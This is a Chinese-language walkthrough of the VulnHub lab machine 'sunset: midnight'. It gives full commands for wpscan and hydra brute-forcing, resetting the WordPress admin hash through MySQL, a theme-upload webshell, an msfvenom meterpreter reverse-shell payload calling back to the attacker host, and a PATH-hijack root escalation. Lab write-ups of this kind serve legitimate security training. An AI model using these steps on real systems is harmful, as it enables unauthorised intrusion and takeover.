# vulnhub靶机-sunset：midnight

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg3ODM0MTE0Nw==&mid=2247484186&idx=1&sn=086d3b1eee6c71e45524ef6fabaf3808&chksm=cf147e6ef863f7787f837efb456104918682a46ee8eba3beec010612333c532154df30ffce21&scene=126&sessionid=1681668512#rd](http://mp.weixin.qq.com/s?__biz=Mzg3ODM0MTE0Nw==&mid=2247484186&idx=1&sn=086d3b1eee6c71e45524ef6fabaf3808&chksm=cf147e6ef863f7787f837efb456104918682a46ee8eba3beec010612333c532154df30ffce21&scene=126&sessionid=1681668512#rd)

目标主机：192.168.12.211

操作机（kali）：192.168.70.128

首先对目标主机进行端口探测，发现存在22、80、3306等端口信息。

![](../Images/1bb982ef2f52005365d8a9dbe1638a8d.png)

然后直接访问80端口http://192.168.12.211/，跳转到http://sunset-midnight/域名地址，所以直接对host文件进行了配置后使用域名直接进行访问。

![](../Images/8856ff4f156170c4b5fc956567322d5c.png)

发现看见web服务的网站页面以后，发现其实就是一个WordPress的站点。

![](../Images/e4ae76ba8b9a85c7fe468e56a66d57a1.png)

然后我们尝试使用wpscan对当前站点进行扫描：wpscan --url http://sunset-midnight/，在扫描中发现了一些网站网站路径等相关信息

![](../Images/1e6d85cbde3b7bdd638ec7f663d1a9e6.png)

查看一下当前服务的一些指纹信息，根据WordPress的版本信息搜索了一下当前版本存在的一些漏洞信息，然而发现检索的漏洞在当前版本中并不可用。

![](../Images/f229d9436fcace49d5b152444eb180f5.png)

我们并同步对WordPress的用户进行枚举扫描：wpscan --url http://sunset-midnight --enumerate u，我们获取到admin用户是存在的

![](../Images/f2ebb0a9711298d72c2217d61873692a.png)

然后我们再对获取到的admin用户尝试进行密码爆破攻击：wpscan --url http://sunset-midnight/ -P password.txt -U admin

![](../Images/520c3576dc0f1cbfe6ad9904f0dfbb68.png)

然而我们并没用成功爆破出密码

![](../Images/57574198baa20092d56062d670a2286c.png)

后来直接尝试对数据库进行爆破攻击：hydra 192.168.12.211 mysql -l root -P password.txt

![](../Images/128e9c76f300ccad60acad596e6235f1.png)

成功爆破出了mysql数据库的用户密码：\[3306\]\[mysql\] host: 192.168.12.211 login: root password: robert

接下来直接使用了kali远程连接数据库进行操作：mysql -u root -p -h sunset-midnight

![](../Images/70f54860f252ab67316491f4b3b30f30.png)

成功连接了数据库后我们直接操作数据库修改当前WordPress中admin用户的密码信息：

show databases; #查看数据库信息

use wordpress; #定位切换数据库

select user*pass from wp*users; #查询当前网站用户密码信息

我们看见数据库用户表中其实只有一条用户数据信息，所以我们直接这条数据的密码进行修改

![](../Images/46293cc6a3d1bfc9868d6c4f0564c7ef.png)

我们将覆盖的密码数据是我们自己想要设置的一个密码进行MD5加密：

update wp*users SET user*pass="76a2173be6393254e72ffa4d6df1030a" where id=1; #使用passwd进行MD5加密后去修改之前的密码信息

![](../Images/eb67a47e8123a099cc7042ae8cbf6911.png)

可以看到我们的密码直接修改成功，然后我们就使用我们修改后的密码直接登陆WordPress后台进行getshell操作。

![](../Images/2c2e53b4d0d282153c1f80b5c3cad652.png)

通过上传主题文件来getshell 首先先去官网下载一个主题压缩包，之后将执行代码和系统命令的源码写入shell.php中，然后将其放入压缩包一起上传

![](../Images/fc64e5891c475cfc25baac2ddb63738c.png)

之后访问/wp-content/themes/\[主题名\]/\[shell文件名\]即可得到一个shell，成功获取了系统权限

![](../Images/3df3efa52d5adf274f448bb5fb6c5bf3.png)

然后我们尝试进行shell反弹，使用nc监听非常不稳定，根本无法进行shell连接，尝试使用msf生成getshell的木马文件进行反弹shell：

![](../Images/5b3b224fdd72c5d0c6994a45b6bc1342.png)

所以下面使用msfvenom生成shell.php，msf进行监听获得shell

访问appearance->add new ->upload theme进行上传

msfvenom -p php/meterpreter/reverse\_tcpLHOST=192.168.12.128 LPORT=7777 R > getshell.php

![](../Images/1d823b66b9526edbc8412842882efa8d.png)

访问请求shell文件，代码执行后shell获取成功

![](../Images/edf02bbb8bc79186f615ee4c25dfaaa9.png)

直接进入shell功能，对主机进行信息收集

![](../Images/7cd1697d3eb0d3ec770a17f84d50a007.png)

我们通过翻阅了网站的数据库连接文件获取了数据库连接的账号jose和密码

![](../Images/0a7d3d5587d3981004d4ea783c02b9e5.png)

然后我们又在系统用户信息中发现存在一个用户与网站数据库连接用户jose相对应

![](../Images/a49987bcb9b34adbefbbdcc42a5395d1.png)

然后我们尝试使用数据库连接用户的密码切换到jose用户,直接成功切入。使用 `sudo-l`查看当前权限，发现jose不能使用sudo。

![](../Images/9c549701be3c77add739f19206f2d322.png)

查看SUDI权限的文件：find / -perm -u=s -type f 2>/dev/null

![](../Images/7f487f65577b302e71aa977bb09005be.png)

由于不能使用sudo命令，所以大多数命令都不能进行提权，但是发现存在一个status命令，并不太常见，执行一下

![](../Images/a245e3aec2daea47b9ae3456aeca04ae.png)

从上面可以看到status使用了service命令，但是为未使用service的绝对路径，所以可以尝试更改$PATH来执行该文件

```
1.  `cd /tmp`
    
2.  
    
3.  `echo "/bin/bash" > service`
    
4.  
    
5.  `chmod 777 service`
    
6.  
    
7.  `echo $PATH`
    
8.  
    
9.  `export PATH=/tmp:$PATH #将/tmp添加到环境变量中`
    
10.  
     
11.  `status`
     
```

再次执行之后便成功获得了root权限

![](../Images/e5f41bc9b33d32e7627507f280177ed2.png)
